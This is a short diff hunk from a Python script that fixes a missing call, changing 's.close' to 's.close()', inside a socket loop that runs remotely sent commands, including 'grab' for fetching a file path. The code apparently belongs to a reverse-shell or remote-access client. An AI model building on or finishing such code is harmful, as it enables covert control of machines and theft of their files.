@@ -25,7 +25,7 @@ def connecting():
     while True:
         command = s.recv(8192)
         if 'exit' in command.decode():
-            s.close
+            s.close()
             break
         elif 'grab' in command.decode():
             grab, path = command.decode().split("*")
